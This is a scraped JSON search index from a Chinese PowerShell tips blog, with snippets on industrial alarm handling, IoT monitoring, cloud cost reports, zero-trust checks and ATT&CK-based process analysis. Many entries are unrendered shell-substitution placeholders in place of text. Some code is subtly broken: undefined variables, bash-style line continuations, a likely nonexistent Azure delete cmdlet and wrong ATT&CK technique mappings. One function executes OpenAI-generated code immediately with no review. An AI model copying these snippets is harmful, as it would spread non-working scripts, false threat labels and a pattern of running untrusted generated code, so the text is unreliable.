RawData = @() AggregatedData = @{} Quality = @{} } # 获取过程数据 $data = Get-ProcessData -ProcessID $ProcessID ` -StartTime $StartTime ` -EndTime $EndTime ` -Tags $Tags ` -SamplingRate $SamplingRate foreach ($record in $data) { # 存储原始数据 if ($DataFormat -in @(&quot;Raw&quot;, &quot;Both&quot;)) { $collection.RawData += [PSCustomObject]@{ Timestamp = $record.Timestamp Values = $record.Values Quality = $record.Quality } } # 计算聚合数据 if ($DataFormat -in @(&quot;Aggregated&quot;, &quot;Both&quot;)) { foreach ($tag in $Tags) { if (-not $collection.AggregatedData.ContainsKey($tag)) { $collection.AggregatedData[$tag] = @{ Min = [double]::MaxValue Max = [double]::MinValue Sum = 0 Count = 0 Quality = 0 } } $value = $record.Values[$tag] $quality = $record.Quality[$tag] $collection.AggregatedData[$tag].Min = [Math]::Min($collection.AggregatedData[$tag].Min, $value) $collection.AggregatedData[$tag].Max = [Math]::Max($collection.AggregatedData[$tag].Max, $value) $collection.AggregatedData[$tag].Sum += $value $collection.AggregatedData[$tag].Count++ $collection.AggregatedData[$tag].Quality += $quality } } } # 计算统计数据 foreach ($tag in $Tags) { if ($collection.AggregatedData.ContainsKey($tag)) { $stats = $collection.AggregatedData[$tag] $stats.Average = $stats.Sum / $stats.Count $stats.Quality = $stats.Quality / $stats.Count } } # 存储数据 if ($StoragePath) { $collection | ConvertTo-Json -Depth 10 | Out-File -FilePath $StoragePath } return $collection } catch { Write-Error &quot;数据采集失败：$_&quot; return $null }} 报警管理最后，创建一个用于管理工业过程报警的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105function Manage-ProcessAlarms { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ProcessID, [Parameter()] [string[]]$AlarmTypes, [Parameter()] [ValidateSet(&quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;)] [string]$Priority, [Parameter()] [string]$Operator, [Parameter()] [string]$Notes, [Parameter()] [switch]$Acknowledge ) try { $alarmManager = [PSCustomObject]@{ ProcessID = $ProcessID StartTime = Get-Date Alarms = @() Actions = @() } # 获取活动报警 $activeAlarms = Get-ActiveAlarms -ProcessID $ProcessID ` -Types $AlarmTypes ` -Priority $Priority foreach ($alarm in $activeAlarms) { $alarmInfo = [PSCustomObject]@{ AlarmID = $alarm.ID Type = $alarm.Type Priority = $alarm.Priority Description = $alarm.Description Timestamp = $alarm.Timestamp Status = $alarm.Status Values = $alarm.Values Actions = @() } # 处理报警 if ($Acknowledge) { $acknowledgeResult = Acknowledge-Alarm -AlarmID $alarm.ID ` -Operator $Operator ` -Notes $Notes $alarmInfo.Status = &quot;Acknowledged&quot; $alarmInfo.Actions += [PSCustomObject]@{ Time = Get-Date Action = &quot;Acknowledge&quot; Operator = $Operator Notes = $Notes } } # 执行报警动作 $actions = Get-AlarmActions -AlarmID $alarm.ID foreach ($action in $actions) { $actionResult = [PSCustomObject]@{ ActionID = $action.ID Description = $action.Description StartTime = Get-Date Status = &quot;InProgress&quot; } try { $result = Invoke-AlarmAction -AlarmID $alarm.ID ` -ActionID $action.ID ` -Parameters $action.Parameters $actionResult.Status = &quot;Success&quot; $actionResult.Result = $result } catch { $actionResult.Status = &quot;Failed&quot; $actionResult.Error = $_.Exception.Message } finally { $actionResult.EndTime = Get-Date $alarmInfo.Actions += $actionResult } } $alarmManager.Alarms += $alarmInfo } # 更新报警状态 $alarmManager.EndTime = Get-Date return $alarmManager } catch { Write-Error &quot;报警管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理工业控制系统的示例： 123456789101112131415161718192021222324252627282930313233343536# 配置过程控制参数$processConfig = @{ ProcessID = &quot;REACTOR001&quot; Mode = &quot;Normal&quot; Parameters = @{ Temperature = 150 Pressure = 10 FlowRate = 100 } AutoStart = $true Timeout = 600}# 启动过程控制$control = Manage-ProcessControl -ProcessID $processConfig.ProcessID ` -Mode $processConfig.Mode ` -Parameters $processConfig.Parameters ` -AutoStart:$processConfig.AutoStart ` -Timeout $processConfig.Timeout# 采集过程数据$data = Collect-ProcessData -ProcessID &quot;REACTOR001&quot; ` -StartTime (Get-Date).AddHours(-1) ` -EndTime (Get-Date) ` -Tags @(&quot;Temperature&quot;, &quot;Pressure&quot;, &quot;FlowRate&quot;) ` -SamplingRate 1 ` -StoragePath &quot;C:\\Data\\reactor001_data.json&quot; ` -DataFormat &quot;Both&quot;# 管理过程报警$alarms = Manage-ProcessAlarms -ProcessID &quot;REACTOR001&quot; ` -AlarmTypes @(&quot;Temperature&quot;, &quot;Pressure&quot;) ` -Priority &quot;High&quot; ` -Operator &quot;John Smith&quot; ` -Notes &quot;系统维护&quot; ` -Acknowledge 最佳实践 实施严格的过程控制 建立完整的数据采集系统 实现多级报警机制 保持详细的运行记录 定期进行系统校准 实施访问控制策略 建立应急响应机制 保持系统文档更新","link":"/2024/09/05/powershell-industrial-control/"},{"title":"PowerShell 技能连载 - OpenAI 智能运维自动化","text":"123456789101112131415161718192021222324252627282930313233343536function Invoke-AIOpsAutomation { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$OperationContext, [ValidateRange(1,100)] [int]$MaxTokens = 60 ) $apiKey = $env:OPENAI_API_KEY $prompt = @&quot;作为资深PowerShell运维专家，请根据以下运维场景生成可执行的解决方案：场景：$OperationContext要求：1. 使用标准PowerShell命令2. 包含错误处理机制3. 输出结构化数据4. 确保跨平台兼容性&quot;@ $body = @{ model = &quot;gpt-3.5-turbo&quot; messages = @(@{role=&quot;user&quot;; content=$prompt}) max_tokens = $MaxTokens } | ConvertTo-Json $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' \\ -Method Post \\ -Headers @{ Authorization = &quot;Bearer $apiKey&quot; } \\ -ContentType 'application/json' \\ -Body $body $codeBlock = $response.choices[0].message.content -replace '```powershell','' -replace '```','' [scriptblock]::Create($codeBlock).Invoke()} 核心功能： 自然语言转PowerShell代码生成 动态脚本编译与执行 OpenAI API安全集成 跨平台兼容性保障 典型应用场景： 根据自然语言描述自动生成日志分析脚本 将故障现象描述转换为诊断代码 创建复杂运维任务的快速原型 生成符合企业规范的脚本模板","link":"/2024/09/06/powershell-openai-automation/"},{"title":"PowerShell并行处理核心原理","text":"RunspacePool基础架构123456789101112131415161718192021$pool = [RunspaceFactory]::CreateRunspacePool(1, 5)$pool.Open()$tasks = 1..10 | ForEach-Object { $ps = [PowerShell]::Create().AddScript({ param($i) Start-Sleep (Get-Random -Max 3) &quot;任务$_完成于$(Get-Date)&quot; }).AddArgument($_) $ps.RunspacePool = $pool @{ Pipe=$ps; Async=$ps.BeginInvoke() }}$results = $tasks | ForEach-Object { $_.Pipe.EndInvoke($_.Async) $_.Pipe.Dispose()}$pool.Close()$results 负载均衡策略 动态调整运行空间数量 任务队列优先级划分 异常任务自动重启 内存占用监控机制 性能优化技巧 避免共享变量使用同步锁 采用批处理模式减少上下文切换 合理设置初始/最大运行空间数 使用ThrottleLimit参数控制并发量","link":"/2024/09/09/powershell-parallel-processing/"},{"title":"","text":"$(cat _posts/2024-09-10-powershell-smart-agriculture.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/10/powershell-smart-agriculture/"},{"title":"PowerShell 技能连载 - IoT边缘设备监控","text":"在工业物联网场景中，边缘设备监控至关重要。以下脚本实现设备状态采集与异常预警： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566function Get-IoTDeviceStatus { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string[]]$DeviceIPs, [ValidateRange(1,100)] [int]$SamplingInterval = 30 ) $report = [PSCustomObject]@{ Timestamp = Get-Date OnlineDevices = @() OfflineDevices = @() HighTempDevices = @() LowBatteryDevices = @() } try { # 设备状态轮询 $DeviceIPs | ForEach-Object -Parallel { $response = Test-NetConnection -ComputerName $_ -Port 502 -InformationLevel Quiet $telemetry = Invoke-RestMethod -Uri &quot;http://$_/metrics&quot; -TimeoutSec 3 [PSCustomObject]@{ IP = $_ Online = $response Temperature = $telemetry.temp BatteryLevel = $telemetry.battery LastSeen = Get-Date } } -ThrottleLimit 10 # 数据分析 $results | ForEach-Object { if(-not $_.Online) { $report.OfflineDevices += $_.IP continue } $report.OnlineDevices += $_.IP if($_.Temperature -gt 85) { $report.HighTempDevices += $_.IP } if($_.BatteryLevel -lt 20) { $report.LowBatteryDevices += $_.IP } } # 触发预警 if($report.HighTempDevices.Count -gt 0) { Send-Notification -Type &quot;HighTemp&quot; -Devices $report.HighTempDevices } if($report.LowBatteryDevices.Count -gt 0) { Send-Notification -Type &quot;LowBattery&quot; -Devices $report.LowBatteryDevices } } catch { Write-Warning &quot;设备监控异常: $_&quot; } return $report} 实现原理： 使用并行处理加速多设备状态采集 通过Test-NetConnection验证设备在线状态 调用REST API获取设备遥测数据 设置温度(85°C)和电量(20%)双重预警阈值 自动触发邮件/短信通知机制 使用示例： 12$devices = '192.168.1.100','192.168.1.101','192.168.1.102'Get-IoTDeviceStatus -DeviceIPs $devices -SamplingInterval 60 最佳实践： 与TSDB时序数据库集成存储历史数据 配置指数退避策略应对网络波动 添加设备白名单安全机制 实现预警静默时段功能 注意事项：• 需要设备开放502端口和/metrics端点• 建议使用硬件加密模块保护通信安全• 监控间隔不宜小于30秒","link":"/2024/09/11/powershell-iot-monitoring/"},{"title":"","text":"$(cat _posts/2024-09-12-powershell-database-operations.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell中的数据处理能力。PowerShell擅长处理各种数据格式，如CSV、XML、JSON等，并提供了丰富的命令和技术来转换、过滤和操作数据。这些功能使PowerShell成为数据提取、转换和加载(ETL)流程的理想选择。\\n/}pd}p’)","link":"/2024/09/12/powershell-database-operations/"},{"title":"","text":"$(cat _posts/2024-09-13-powershell-module-development.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/13/powershell-module-development/"},{"title":"PowerShell 技能连载 - 基于ATT&amp;CK框架的进程行为分析","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546function Invoke-ProcessBehaviorAnalysis { [CmdletBinding()] param( [Parameter(ValueFromPipeline=$true)] [string]$ComputerName = $env:COMPUTERNAME ) $techniques = Invoke-RestMethod -Uri 'https://attack.mitre.org/api/techniques/' $processes = Get-CimInstance -ClassName Win32_Process -ComputerName $ComputerName $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' SuspiciousProcesses = @() MITRETechniques = @() } $processes | ForEach-Object { $behaviorScore = 0 $matchedTechs = @() # 检测隐藏进程 if ($_.ParentProcessId -ne 1 -and -not (Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue)) { $behaviorScore += 20 $matchedTechs += 'T1055' # Process Injection } # 检测异常内存操作 if ($_.WorkingSetSize -gt 1GB) { $behaviorScore += 15 $matchedTechs += 'T1056' # Memory Allocation } if ($behaviorScore -gt 25) { $report.SuspiciousProcesses += [PSCustomObject]@{ ProcessName = $_.Name ProcessId = $_.ProcessId Score = $behaviorScore CommandLine = $_.CommandLine } $report.MITRETechniques += $matchedTechs | Select-Object @{n='TechniqueID';e={$_}}, @{n='Description';e={$techniques.techniques.Where{$_.id -eq $_}.name}} } } $report | ConvertTo-Json -Depth 3 | Out-File &quot;$env:TEMP/ProcessAnalysis_$(Get-Date -Format yyyyMMdd).json&quot; return $report} 核心功能： ATT&amp;CK技术特征匹配 进程行为异常评分 自动化威胁检测 JSON报告生成 典型应用场景： 企业终端安全监控 红队攻击痕迹分析 蓝队防御策略验证 安全事件快速响应","link":"/2024/09/16/powershell-attack-detection/"},{"title":"","text":"$(cat _posts/2024-09-17-powershell-pester-testing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/17/powershell-pester-testing/"},{"title":"","text":"$(cat _posts/2024-09-18-powershell-audio-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/18/powershell-audio-processing/"},{"title":"","text":"$(cat _posts/2024-09-20-powershell-azure-functions.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2024/09/20/powershell-azure-functions/"},{"title":"","text":"$(cat _posts/2024-09-19-powershell-advanced-parameters.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/19/powershell-advanced-parameters/"},{"title":"","text":"$(cat _posts/2024-09-23-powershell-jea-security.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/23/powershell-jea-security/"},{"title":"","text":"$(cat _posts/2024-09-24-powershell-pipeline-filter.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/24/powershell-pipeline-filter/"},{"title":"","text":"$(cat _posts/2024-09-26-powershell-collection-types.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/26/powershell-collection-types/"},{"title":"","text":"$(cat _posts/2024-09-27-powershell-parameter-passing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/09/27/powershell-parameter-passing/"},{"title":"PowerShell 技能连载 - 多云成本优化自动化系统","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function Get-CloudCostReport { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string[]]$SubscriptionIds, [ValidateSet('Daily','Monthly')] [string]$Granularity = 'Monthly' ) $costReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' TotalCost = 0 ServiceBreakdown = @{} OptimizationSuggestions = @() } try { # 获取跨云成本数据 $costData = $SubscriptionIds | ForEach-Object { Invoke-RestMethod -Uri &quot;https://management.azure.com/subscriptions/$_/providers/Microsoft.CostManagement/query?api-version=2023-03-01&quot; \\ -Headers @{ Authorization = &quot;Bearer $env:AZURE_TOKEN&quot; } \\ -Body (@{ type = &quot;ActualCost&quot; timeframe = &quot;MonthToDate&quot; dataset = @{ aggregation = @{ totalCost = @{ name = &quot;Cost&quot; function = &quot;Sum&quot; } } grouping = @( @{ type = &quot;Dimension&quot; name = &quot;ServiceName&quot; } ) } } | ConvertTo-Json) } # 分析成本结构 $costReport.TotalCost = ($costData.properties.rows | Measure-Object -Property [0] -Sum).Sum $costReport.ServiceBreakdown = $costData.properties.rows | Group-Object { $_[1] } -AsHashTable | ForEach-Object { @{$_.Key = [math]::Round($_.Value[0],2)} } # 生成优化建议 $costData.properties.rows | Where-Object { $_[0] -gt 1000 } | ForEach-Object { $costReport.OptimizationSuggestions += [PSCustomObject]@{ Service = $_[1] Cost = $_[0] Recommendation = &quot;考虑预留实例或自动缩放配置&quot; } } } catch { Write-Error &quot;成本数据获取失败: $_&quot; } # 生成Excel格式报告 $costReport | Export-Excel -Path &quot;$env:TEMP/CloudCostReport_$(Get-Date -Format yyyyMMdd).xlsx&quot; return $costReport} 核心功能： 跨云成本数据聚合分析 服务维度费用结构分解 智能优化建议生成 Excel格式报告输出 应用场景： 多云环境成本监控 预算超支预警 资源使用效率优化 财务部门合规报告","link":"/2024/09/30/powershell-cloud-cost-optimization/"},{"title":"PowerShell 技能连载 - 零信任架构下的设备健康检查","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function Invoke-DeviceHealthCheck { param( [string[]]$ComputerNames = $env:COMPUTERNAME ) $securityBaseline = @{ SecureBootEnabled = $true TPMPresent = $true BitLockerStatus = 'FullyEncrypted' AntivirusStatus = 'Enabled' FirewallProfile = 'Domain' } $results = @() foreach ($computer in $ComputerNames) { try { $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computer $tpm = Get-CimInstance -ClassName Win32_Tpm -ComputerName $computer -ErrorAction Stop $bitlocker = Get-BitLockerVolume -MountPoint $osInfo.SystemDrive -ErrorAction Stop $healthStatus = [PSCustomObject]@{ ComputerName = $computer LastBootTime = $osInfo.LastBootUpTime SecureBoot = [bool](Confirm-SecureBootUEFI) TPMVersion = $tpm.SpecVersion BitLockerProtection = $bitlocker.ProtectionStatus DefenderStatus = (Get-MpComputerStatus).AntivirusEnabled FirewallStatus = (Get-NetFirewallProfile -Name Domain).Enabled ComplianceScore = 0 } # 计算合规分数 $healthStatus.ComplianceScore = [math]::Round(( ($healthStatus.SecureBoot -eq $securityBaseline.SecureBootEnabled) + ($healthStatus.TPMVersion -match '2.0') + ($healthStatus.BitLockerProtection -eq 'On') + ($healthStatus.DefenderStatus -eq $true) + ($healthStatus.FirewallStatus -eq $true) ) / 5 * 100, 2) $results += $healthStatus } catch { Write-Warning &quot;$computer 健康检查失败: $_&quot; } } $results | Format-Table -AutoSize} 核心功能： 自动化验证设备安全基线配置 检测TPM 2.0和SecureBoot状态 评估BitLocker加密状态 生成设备合规性评分 应用场景： 零信任网络接入前检查 远程办公设备安全审计 合规性自动化报告生成","link":"/2024/10/01/powershell-zero-trust/"},{"title":"PowerShell 技能连载 - 供应链安全漏洞扫描工具","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function Invoke-SupplyChainScan { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ScanPath, [ValidateSet('Critical','High','Medium','Low')] [string]$SeverityLevel = 'Critical' ) $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' ScannedComponents = @() SecurityFindings = @() } # 组件哈希校验 Get-ChildItem $ScanPath -Recurse -Include *.dll,*.exe,*.psm1 | ForEach-Object { $fileHash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash $signature = Get-AuthenticodeSignature $_.FullName $component = [PSCustomObject]@{ FileName = $_.Name FilePath = $_.FullName SHA256 = $fileHash IsSigned = $signature.Status -eq 'Valid' Publisher = $signature.SignerCertificate.Subject } $report.ScannedComponents += $component if (-not $component.IsSigned) { $report.SecurityFindings += [PSCustomObject]@{ Severity = 'High' Description = &quot;未签名的组件: $($_.Name)&quot; Recommendation = &quot;要求供应商提供数字签名版本或验证组件来源&quot; } } } # 依赖包漏洞扫描 $nugetPackages = Get-ChildItem $ScanPath -Recurse -Include packages.config $nugetPackages | ForEach-Object { [xml]$config = Get-Content $_.FullName $config.packages.package | ForEach-Object { $cveData = Invoke-RestMethod &quot;https://api.cvecheck.org/v1/search?id=$($_.id)&quot; if ($cveData.vulnerabilities | Where-Object { $_.severity -ge $SeverityLevel }) { $report.SecurityFindings += [PSCustomObject]@{ Severity = $SeverityLevel Description = &quot;存在漏洞的依赖包: $($_.id) v$($_.version)&quot; Recommendation = &quot;升级到最新安全版本 $($cveData.latestVersion)&quot; } } } } $report | Export-Csv -Path &quot;$ScanPath\\SupplyChainReport_$(Get-Date -Format yyyyMMdd).csv&quot; -NoTypeInformation return $report} 核心功能： 软件组件供应链安全扫描 依赖包漏洞自动化检测 数字签名验证机制 CVE漏洞数据库集成 典型应用场景： 开发环境第三方组件安全检查 软件构建流水线安全审计 供应商交付物合规验证 企业软件资产安全基线报告生成","link":"/2024/10/03/powershell-supplychain-security/"},{"title":"","text":"","link":"/2024/10/02/powershell-education-integration/"},{"title":"","text":"$(cat _posts/2024-10-04-powershell-json-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell中的数据处理能力。PowerShell擅长处理各种数据格式，如CSV、XML、JSON等，并提供了丰富的命令和技术来转换、过滤和操作数据。这些功能使PowerShell成为数据提取、转换和加载(ETL)流程的理想选择。\\n/}pd}p’)","link":"/2024/10/04/powershell-json-handling/"},{"title":"","text":"$(cat _posts/2024-10-07-bach-server-port-detection.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/07/bach-server-port-detection/"},{"title":"","text":"","link":"/2024/10/08/powershell-powerpoint-processing/"},{"title":"","text":"$(cat _posts/2024-10-10-powershell-variable-scope.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/10/powershell-variable-scope/"},{"title":"","text":"$(cat _posts/2024-10-14-powershell-image-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/14/powershell-image-processing/"},{"title":"PowerShell 技能连载 - 基于Azure Functions的无服务器安全检测","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344function Invoke-SecurityScan { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ResourceGroup, [ValidateSet('Critical','High','Medium')] [string]$SeverityLevel = 'High' ) $securityReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' ScannedResources = @() SecurityFindings = @() } # 获取Azure安全中心警报 $alerts = Get-AzSecurityAlert -ResourceGroupName $ResourceGroup | Where-Object { $_.Severity -eq $SeverityLevel } # 自动化响应流程 $alerts | ForEach-Object { $securityReport.ScannedResources += [PSCustomObject]@{ ResourceID = $_.ResourceId AlertType = $_.AlertType CompromiseEntity = $_.CompromisedEntity } # 触发自动化修复动作 if($_.AlertType -eq 'UnusualResourceDeployment') { Start-AzResourceDelete -ResourceId $_.ResourceId -Force $securityReport.SecurityFindings += [PSCustomObject]@{ Action = 'DeletedSuspiciousResource' ResourceID = $_.ResourceId Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' } } } # 生成安全态势报告 $securityReport | ConvertTo-Json -Depth 3 | Out-File -FilePath &quot;$env:TEMP/AzureSecReport_$(Get-Date -Format yyyyMMdd).json&quot; return $securityReport} 核心功能： 实时获取Azure安全中心高等级警报 异常资源部署自动隔离机制 JSON格式安全态势报告生成 多严重级别安全事件过滤 典型应用场景： 云环境异常操作实时响应 自动化安全基线维护 多云订阅安全状态聚合 合规审计日志自动生成","link":"/2024/10/15/powershell-azure-functions-security/"},{"title":"PowerShell 技能连载 - 零信任架构下的设备健康检查","text":"123456789101112131415161718192021222324252627282930313233343536373839404142function Invoke-DeviceHealthCheck { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$DeviceName ) $healthReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' Device = $DeviceName TPMEnabled = $false SecureBoot = $false AntivirusStatus = 'Unknown' ComplianceScore = 0 } try { # 检查TPM状态 $tpm = Get-Tpm -ErrorAction Stop $healthReport.TPMEnabled = $tpm.TpmPresent # 验证安全启动状态 $healthReport.SecureBoot = Confirm-SecureBootUEFI # 获取反病毒状态 $avStatus = Get-MpComputerStatus $healthReport.AntivirusStatus = $avStatus.AMServiceEnabled ? 'Active' : 'Inactive' # 计算合规分数 $compliance = 0 if($healthReport.TPMEnabled) { $compliance += 30 } if($healthReport.SecureBoot) { $compliance += 30 } if($healthReport.AntivirusStatus -eq 'Active') { $compliance += 40 } $healthReport.ComplianceScore = $compliance } catch { Write-Warning &quot;设备健康检查失败: $_&quot; } $healthReport | Export-Clixml -Path &quot;$env:TEMP/DeviceHealth_$DeviceName.xml&quot; return $healthReport} 核心功能： TPM芯片状态验证 安全启动模式检测 反病毒服务状态监控 自动化合规评分 应用场景： 零信任架构准入控制 远程办公设备安全审计 合规性基线验证 安全事件响应前置检查","link":"/2024/10/16/powershell-zero-trust-healthcheck/"},{"title":"","text":"$(cat _posts/2024-10-17-powershell-openai-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/17/powershell-openai-integration/"},{"title":"","text":"$(cat _posts/2024-10-18-powershell-xml-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell中的数据处理能力。PowerShell擅长处理各种数据格式，如CSV、XML、JSON等，并提供了丰富的命令和技术来转换、过滤和操作数据。这些功能使PowerShell成为数据提取、转换和加载(ETL)流程的理想选择。\\n/}pd}p’)","link":"/2024/10/18/powershell-xml-processing/"},{"title":"","text":"$(cat _posts/2024-10-21-powershell-smart-building.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/21/powershell-smart-building/"},{"title":"PowerShell Technology Interactive Community Growth Status (March 2024)","text":"By March 2024, the number of “PowerShell Technology interaction” community has reached 1,964 people, very close to the maximum capacity of the community (2,000 people), and maintain the position of PowerShell largest Chinese community. According to Tencent’s social platform strategy, the maximum number of people in the community is 2,000, and we will keep the opportunity to provide active users as much as possible.至 2024 年 3 月，“PowerShell 技术互动”社区人数已达到 1964 人，十分接近社区最大容量（2000 人），保持 PowerShell 最大中文社区的位置。根据腾讯社交平台的策略，社区人数的上限为 2000 人，我们会尽可能保留机会给活跃用户。 If you encounter technical problems with PowerShell, or have good resources to share, please join us. QQ group number: 271143343.如您遇到 PowerShell 方面的技术问题，或有好的资源希望分享，请加入我们。QQ 群号：271143343。 Or scan the QR code with your mobile phone QQ:或者用手机 QQ 扫描二维码：","link":"/2024/10/22/powershell-technology-interactive-community-growth-status%20copy/"},{"title":"PowerShell 技能连载 - 物联网设备状态监控实战","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function Start-EdgeDeviceMonitor { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$BrokerUrl, [Parameter(Mandatory=$true)] [string[]]$DeviceTopics ) Add-Type -Path &quot;MQTTnet.dll&quot; $factory = [MQTTnet.MqttFactory]::new() $client = $factory.CreateMqttClient() $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' ConnectedDevices = @() HealthStatus = @() } $clientOptions = [MQTTnet.Client.MqttClientOptionsBuilder]::new() .WithTcpServer($BrokerUrl) .Build() $client.ConnectAsync($clientOptions).Wait() $DeviceTopics | ForEach-Object { $client.SubscribeAsync([MQTTnet.MqttTopicFilterBuilder]::new() .WithTopic($_) .Build()).Wait() $client.ApplicationMessageReceivedHandler = [MQTTnet.MqttApplicationMessageReceivedHandler]{ param($e) $payload = [System.Text.Encoding]::UTF8.GetString($e.ApplicationMessage.Payload) $report.ConnectedDevices += 